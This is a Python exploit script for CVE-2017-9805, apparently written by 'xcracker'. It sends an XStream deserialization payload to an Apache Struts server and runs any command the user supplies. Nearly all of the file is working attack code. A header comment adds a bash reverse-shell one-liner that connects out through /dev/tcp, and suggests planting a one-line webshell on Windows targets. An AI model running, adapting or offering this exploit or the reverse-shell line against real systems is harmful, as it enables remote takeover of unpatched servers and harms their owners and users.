#!/usr/bin/env python
#coding=utf-8
# CVE-2017-9805
#python st2-052.py "192.168.1.1" "8080" "command"
#bash -i >&amp; /dev/tcp/x.x.x.x/port 0>&amp;1 反弹shell，windows直接写一句话
#wrote by xcracker
import requests
import sys

def divchar(cmd):
    C = cmd.split()
    a=''
    for i in C:
       a = a + '<string>' + i + '</string>'
    return a
    

def run(params):
    url = params['IP']
    ip = params['PORT']
    cmd = params['CMD']
    PoC = '''
        <map> 
        <entry> 
        <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> 
        <command>'''+cmd+'''
        </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
        </entry> 
        </map>
                '''
          
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Content-Type': 'application/xml',
    'Content-Length': '16630',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'}
    d = requests.post(url,data=PoC,headers=headers)
    if d.status_code == 500 and not d.content.find('java.security.Provider$Service') == -1:
#        return {'result':'1', 'originalResult':d.content}
        return True
    else:
        return False
 


if __name__ == "__main__":
    url = sys.argv[1]
    port = sys.argv[2]
    command = sys.argv[3]
    cmd = divchar(command)
    a = run({'IP':url, 'PORT':port, 'CMD':cmd})
    if a:
        print 'succeed!'
    else:
        print 'faild!'
